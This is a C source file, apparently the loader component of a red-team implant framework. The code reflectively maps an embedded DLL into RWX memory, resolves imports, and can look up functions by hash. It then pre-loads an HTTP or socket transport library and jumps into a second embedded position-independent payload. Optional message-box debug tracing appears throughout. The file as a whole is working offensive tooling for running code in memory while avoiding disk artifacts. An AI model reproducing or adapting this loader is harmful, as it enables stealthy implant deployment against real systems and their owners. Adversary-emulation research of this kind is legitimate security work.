/*
 * Copyright 2025-2026 Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include <windows.h>
#include "tcg.h"

WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc (LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);

FARPROC resolve(DWORD modHash, DWORD funcHash) {
	HANDLE hModule = findModuleByHash(modHash);
	return findFunctionByHash(hModule, funcHash);
}

FARPROC resolve_ext(const char *mod, const char *func) {
	HANDLE hModule = GetModuleHandleA(mod);
	if (hModule == NULL)
		hModule = LoadLibraryA(mod);
	return GetProcAddress(hModule, func);
}

#ifdef WIN_X86
__declspec(noinline) ULONG_PTR caller( VOID ) { return (ULONG_PTR)WIN_GET_CALLER(); }
#endif

char g_dll[0]   __attribute__((section("my_data")));
char g_pico[0]  __attribute__((section("my_pico")));

typedef void (*PICOMAIN_FUNC_3)(char * loader, char * dllEntry, char * dllBase);

#ifdef AGENT_DEBUG
typedef int (WINAPI *MSGBOXA_FUNC)(HWND, LPCSTR, LPCSTR, UINT);
static void loader_dbg(IMPORTFUNCS * funcs, const char * title, const char * msg) {
	HMODULE hUser32 = (HMODULE)funcs->LoadLibraryA("user32.dll");
	if (hUser32) {
		MSGBOXA_FUNC fn = (MSGBOXA_FUNC)funcs->GetProcAddress(hUser32, "MessageBoxA");
		if (fn) fn(NULL, msg, title, 0);
	}
}
#else
#define loader_dbg(funcs, title, msg) ((void)0)
#endif

void RunViaFreeCOFF(IMPORTFUNCS * funcs, char * dllEntry, char *dllBase) {
	char * dstCode;
	char * dstData;

	loader_dbg(funcs, "loader.c", "RunViaFreeCOFF entered\nAllocating PICO memory...");

	dstData = KERNEL32$VirtualAlloc( NULL, PicoDataSize(g_pico), MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, PAGE_READWRITE );
	dstCode = KERNEL32$VirtualAlloc( NULL, PicoCodeSize(g_pico), MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE );

	if (!dstData || !dstCode) return;

	loader_dbg(funcs, "loader.c", "PICO memory allocated\nCalling PicoLoad...");

	PicoLoad(funcs, g_pico, dstCode, dstData);

	loader_dbg(funcs, "loader.c", "PicoLoad done\nJumping to PICO go()...");

	((PICOMAIN_FUNC_3)PicoEntryPoint(g_pico, dstCode)) (__text_begin(), dllEntry, dllBase);
}

void go() {
	char       * dst;
	DLLDATA      data;
	IMPORTFUNCS  funcs;

	ParseDLL(g_dll, &data);
	dst = KERNEL32$VirtualAlloc( NULL, SizeOfDLL(&data), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE );
	if (!dst) return;
	LoadDLL(&data, g_dll, dst);

	funcs.GetProcAddress = GetProcAddress;
	funcs.LoadLibraryA   = LoadLibraryA;
	ProcessImports(&funcs, &data, dst);

	loader_dbg(&funcs, "loader.c", "DLL loaded, imports resolved\nPre-loading transport DLL...");

#ifdef TRANSPORT_HTTP
	funcs.LoadLibraryA("winhttp.dll");
	loader_dbg(&funcs, "loader.c", "winhttp.dll loaded\nCalling RunViaFreeCOFF...");
#else
	funcs.LoadLibraryA("ws2_32.dll");
	loader_dbg(&funcs, "loader.c", "ws2_32.dll loaded\nCalling RunViaFreeCOFF...");
#endif

	RunViaFreeCOFF(&funcs, (char *)EntryPoint(&data, dst), dst);
}
